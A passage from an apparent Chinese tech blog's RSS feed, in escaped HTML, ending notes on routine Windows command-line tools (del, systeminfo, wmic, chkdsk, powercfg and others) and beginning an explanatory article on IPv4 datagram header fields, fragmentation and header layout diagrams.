&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">del file.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">del /f readonly.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">del /s /q *.tmp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">del /a:h hiddenfile.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="79-type">7.9 &lt;code>type&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：显示文本文件内容。&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">type&lt;/span> readme.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">type&lt;/span> config.ini &lt;span class="p">|&lt;/span> more
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="8-系统信息与诊断命令">8. 系统信息与诊断命令
&lt;/h2>&lt;h3 id="81-systeminfo">8.1 &lt;code>systeminfo&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：显示详细的系统配置信息。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>systeminfo&lt;/code>：显示完整的系统信息。&lt;/li>
&lt;li>&lt;code>systeminfo | findstr /i &amp;quot;内存&amp;quot;&lt;/code>：过滤显示内存相关信息。&lt;/li>
&lt;li>&lt;code>systeminfo /s [计算机名] /u [用户名] /p [密码]&lt;/code>：获取远程计算机的系统信息。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">systeminfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systeminfo &lt;span class="p">|&lt;/span> findstr /i &lt;span class="s2">&amp;#34;OS&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">systeminfo &amp;gt; sysinfo.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="82-driverquery">8.2 &lt;code>driverquery&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：列出所有已安装的设备驱动程序。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>driverquery&lt;/code>：显示所有驱动程序的基本信息。&lt;/li>
&lt;li>&lt;code>driverquery /v&lt;/code>：显示详细信息。&lt;/li>
&lt;li>&lt;code>driverquery /fo [格式]&lt;/code>：以指定格式输出（TABLE、LIST或CSV）。&lt;/li>
&lt;li>&lt;code>driverquery /s [计算机名] /u [用户名] /p [密码]&lt;/code>：查询远程计算机的驱动程序。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">driverquery
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">driverquery /v /fo csv &amp;gt; drivers.csv
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">driverquery &lt;span class="p">|&lt;/span> findstr &lt;span class="s2">&amp;#34;Microsoft&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="83-wmic">8.3 &lt;code>wmic&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：通过WMI获取系统和设备信息。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>wmic os get [属性]&lt;/code>：获取操作系统信息。&lt;/li>
&lt;li>&lt;code>wmic process list [选项]&lt;/code>：列出进程信息。&lt;/li>
&lt;li>&lt;code>wmic startup list [选项]&lt;/code>：列出启动项。&lt;/li>
&lt;li>&lt;code>wmic product get [属性]&lt;/code>：获取已安装软件的信息。&lt;/li>
&lt;li>&lt;code>wmic diskdrive get [属性]&lt;/code>：获取硬盘信息。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">wmic os get Caption,Version,BuildNumber
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wmic process list brief
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wmic startup list full
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wmic product get Name,Version,Vendor
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wmic diskdrive get Model,Size,Status
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="84-chkdsk">8.4 &lt;code>chkdsk&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：检查磁盘并修复错误。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>chkdsk [盘符]&lt;/code>：检查磁盘但不修复错误。&lt;/li>
&lt;li>&lt;code>chkdsk [盘符] /f&lt;/code>：检查磁盘并修复错误。&lt;/li>
&lt;li>&lt;code>chkdsk [盘符] /r&lt;/code>：检查磁盘、修复错误并恢复可读信息。&lt;/li>
&lt;li>&lt;code>chkdsk [盘符] /x&lt;/code>：如有必要强制卸载卷，然后开始检查。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">chkdsk C:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chkdsk D: /f
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chkdsk E: /r
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="85-hostname">8.5 &lt;code>hostname&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：显示或设置主机名。&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">hostname
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="86-msinfo32">8.6 &lt;code>msinfo32&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：显示系统信息摘要。&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">msinfo32
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msinfo32 /nfo sysinfo.nfo
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="87-powercfg">8.7 &lt;code>powercfg&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：管理电源设置和生成能源使用报告。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>powercfg /list&lt;/code>：列出所有电源计划。&lt;/li>
&lt;li>&lt;code>powercfg /setactive [GUID]&lt;/code>：设置活动电源计划。&lt;/li>
&lt;li>&lt;code>powercfg /energy&lt;/code>：生成系统能源效率诊断报告。&lt;/li>
&lt;li>&lt;code>powercfg /batteryreport&lt;/code>：生成电池健康状况报告。&lt;/li>
&lt;li>&lt;code>powercfg /hibernate on|off&lt;/code>：启用或禁用休眠。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">powercfg /list
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">powercfg /energy
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">powercfg /batteryreport /output C:&lt;span class="se">\b&lt;/span>attery_report.html
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">powercfg /hibernate off
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="88-verifier">8.8 &lt;code>verifier&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：验证和检测驱动程序的问题。&lt;/li>
&lt;li>&lt;strong>常用命令&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>verifier /standard /all&lt;/code>：对所有驱动程序启用标准设置。&lt;/li>
&lt;li>&lt;code>verifier /query&lt;/code>：显示当前设置。&lt;/li>
&lt;li>&lt;code>verifier /reset&lt;/code>：禁用驱动程序验证程序。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">verifier /standard /all
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">verifier /query
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">verifier /reset
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;h3 id="89-eventcreate">8.9 &lt;code>eventcreate&lt;/code>
&lt;/h3>&lt;ul>
&lt;li>&lt;strong>功能&lt;/strong>：创建自定义事件日志条目。&lt;/li>
&lt;li>&lt;strong>常用参数&lt;/strong>：
&lt;ul>
&lt;li>&lt;code>/s [计算机名]&lt;/code>：指定远程计算机。&lt;/li>
&lt;li>&lt;code>/t [类型]&lt;/code>：指定事件类型（ERROR、WARNING、INFORMATION、SUCCESS、FAILURE）。&lt;/li>
&lt;li>&lt;code>/id [事件ID]&lt;/code>：指定事件ID。&lt;/li>
&lt;li>&lt;code>/d [描述]&lt;/code>：指定事件描述。&lt;/li>
&lt;li>&lt;code>/l [日志名]&lt;/code>：指定日志文件名。&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>实例&lt;/strong>：
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">eventcreate /t ERROR /id &lt;span class="m">100&lt;/span> /l APPLICATION /d &lt;span class="s2">&amp;#34;测试错误事件&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">eventcreate /t INFORMATION /id &lt;span class="m">200&lt;/span> /l SYSTEM /d &lt;span class="s2">&amp;#34;系统维护信息&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/li>
&lt;/ul>
&lt;p>以上是完整的笔记内容，涵盖了文件中提到的所有命令及其功能和实例。希望这些内容对你有所帮助！&lt;/p></description></item><item><title>IP数据报文字段详解</title><link>https://souljian.cn/p/746087788/</link><pubDate>Thu, 01 May 2025 16:23:08 +0800</pubDate><guid>https://souljian.cn/p/746087788/</guid><description>&lt;h2 id="ip数据报文概述">IP数据报文概述
&lt;/h2>&lt;p>IP（Internet Protocol）数据报文是互联网协议中最基础的数据传输单元。每个IP数据报都包含了确保数据能够正确传输所需的各种信息。本文将详细介绍IP数据报文的各个字段及其作用。&lt;/p>
&lt;h2 id="ip数据报文结构">IP数据报文结构
&lt;/h2>&lt;p>IP数据报文主要由首部和数据两部分组成。其中首部包含了控制信息，而数据部分包含了上层协议的数据。&lt;/p>
&lt;h3 id="首部字段详解">首部字段详解
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>&lt;strong>版本（Version）- 4位&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>用于标识IP协议的版本&lt;/li>
&lt;li>IPv4的值为4，IPv6的值为6&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>首部长度（IHL，Internet Header Length）- 4位&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>标识IP首部的长度&lt;/li>
&lt;li>以32位（4字节）为单位&lt;/li>
&lt;li>最小值为5（表示20字节），最大值为15（表示60字节）&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>服务类型（Type of Service）- 8位&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>用于指定服务质量&lt;/li>
&lt;li>包含优先级和服务类型信息&lt;/li>
&lt;li>现代网络中常用于区分服务（DiffServ）&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>总长度（Total Length）- 16位&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>标识整个IP数据报的长度&lt;/li>
&lt;li>包括首部和数据部分&lt;/li>
&lt;li>最大值为65535字节&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>标识（Identification）- 16位&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>用于分片重组&lt;/li>
&lt;li>同一数据报的所有分片具有相同的标识值&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>标志（Flags）- 3位&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>控制数据报分片&lt;/li>
&lt;li>包括：
&lt;ul>
&lt;li>DF（Don&amp;rsquo;t Fragment）：禁止分片&lt;/li>
&lt;li>MF（More Fragments）：后面还有分片&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>片偏移（Fragment Offset）- 13位&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>指示分片在原始数据报中的位置&lt;/li>
&lt;li>以8字节为单位&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>生存时间（TTL，Time To Live）- 8位&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>防止数据报无限循环&lt;/li>
&lt;li>每经过一个路由器减1&lt;/li>
&lt;li>当值为0时，数据报被丢弃&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>协议（Protocol）- 8位&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>指示上层协议类型&lt;/li>
&lt;li>常见值：
&lt;ul>
&lt;li>1 = ICMP&lt;/li>
&lt;li>6 = TCP&lt;/li>
&lt;li>17 = UDP&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>首部校验和（Header Checksum）- 16位&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>用于检验首部的完整性&lt;/li>
&lt;li>不包括数据部分的校验&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>源IP地址（Source Address）- 32位&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>发送方的IP地址&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>目的IP地址（Destination Address）- 32位&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>接收方的IP地址&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>选项（Options）- 可变长度&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>可选字段&lt;/li>
&lt;li>包含特殊处理信息&lt;/li>
&lt;li>很少使用&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="ip数据报文分片">IP数据报文分片
&lt;/h2>&lt;p>当IP数据报文大小超过网络的MTU（最大传输单元）时，需要进行分片处理：&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>分片规则&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>每个分片都必须是8字节的整数倍&lt;/li>
&lt;li>除最后一个分片外，其他分片的大小应该相等&lt;/li>
&lt;li>所有分片都保持相同的标识字段值&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>分片重组&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>目的主机负责重组&lt;/li>
&lt;li>根据标识字段和片偏移进行重组&lt;/li>
&lt;li>MF标志位用于判断是否为最后一个分片&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="实际应用举例">实际应用举例
&lt;/h2>&lt;ol>
&lt;li>&lt;strong>MTU发现&lt;/strong>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ping -D -s &lt;span class="m">1472&lt;/span> 8.8.8.8 &lt;span class="c1"># 测试最大MTU&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ol start="2">
&lt;li>&lt;strong>查看IP报文结构&lt;/strong>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tcpdump -xx -i eth0 &lt;span class="c1"># 抓取并显示完整的IP报文&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="ip数据报文结构图">IP数据报文结构图
&lt;/h2>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">比特 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0 |版本号(4) |首部长度(4) | 服务类型(8) | 总长度(16) |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 32 | 标识(16) |标志(3)| 片偏移(13) |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 64 | 生存时间(8) | 协议(8) | 首部校验和(16) |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 96 | 源IP地址(32) |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 128 | 目的IP地址(32) |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 160 | 选项 + 填充(可变长度) |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> | 数据部分(可变长度) |
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="服务类型tos字段详细结构">服务类型(ToS)字段详细结构
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> 0 1 2 3 4 5 6 7
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+---+---+---+---+---+---+---+---+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">| 优先级 | D | T | R | C |未用|
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+---+---+---+---+---+---+---+---+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 其中：
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 优先级(0-2位)：指定数据包的优先级
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - D(3位)：延迟，0=普通，1=低延迟
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - T(4位)：吞吐量，0=普通，1=高吞吐量
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - R(5位)：可靠性，0=普通，1=高可靠性
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - C(6位)：成本，0=普通，1=最小成本
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - 未用(7位)：保留位
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="首部结构说明">首部结构说明
&lt;/h3>&lt;ol>
&lt;li>
&lt;p>&lt;strong>固定部分&lt;/strong>（20字节）&lt;/p>
&lt;ul>
&lt;li>版本号到首部校验和的部分&lt;/li>
&lt;li>每个IP数据报必须包含的内容&lt;/li>
&lt;li>长度固定不变&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>可变部分&lt;/strong>（最多40字节）&lt;/p>
&lt;ul>
&lt;li>选项字段&lt;/li>
&lt;li>填充字段&lt;/li>
&lt;li>长度可变，必须是32位的整数倍&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>数据部分&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>可变长度&lt;/li>
&lt;li>承载上层协议的数据&lt;/li>
&lt;li>受MTU限制&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h2 id="ip首部结构表">IP首部结构表
&lt;/h2>&lt;h3 id="基本结构按字节分布">基本结构（按字节分布）
&lt;/h3>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>字节位置&lt;/th>
&lt;th>0&lt;/th>
&lt;th>1&lt;/th>
&lt;th>2&lt;/th>
&lt;th>3&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0-3&lt;/td>
&lt;td>版本(4位)+首部长度(4位)&lt;/td>
&lt;td>服务类型(8位)&lt;/td>
&lt;td>总长度(16位)&lt;/td>
&lt;td>&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4-7&lt;/td>
